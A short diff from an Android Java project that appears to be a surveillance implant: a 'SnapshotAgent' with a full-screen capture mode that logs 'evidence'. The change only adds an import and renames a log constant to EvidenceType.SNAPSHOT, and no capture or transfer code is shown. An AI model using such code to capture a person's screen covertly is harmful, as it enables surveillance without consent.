@@ -12,6 +12,7 @@ import java.nio.ByteOrder;
 
 import android.util.Log;
 
+import com.ht.RCSAndroidGUI.EvidenceType;
 import com.ht.RCSAndroidGUI.LogR;
 import com.ht.RCSAndroidGUI.utils.Utils;
 
@@ -62,7 +63,7 @@ public class SnapshotAgent extends AgentBase {
 	 * @see com.ht.RCSAndroidGUI.ThreadBase#go()
 	 */
 	public void go() {
-		final LogR log = new LogR(Agent.AGENT_SNAPSHOT, LogR.LOG_PRI_STD);
+		final LogR log = new LogR(EvidenceType.SNAPSHOT, LogR.LOG_PRI_STD);
 
 		switch (type) {
 		case CAPTURE_FULLSCREEN:
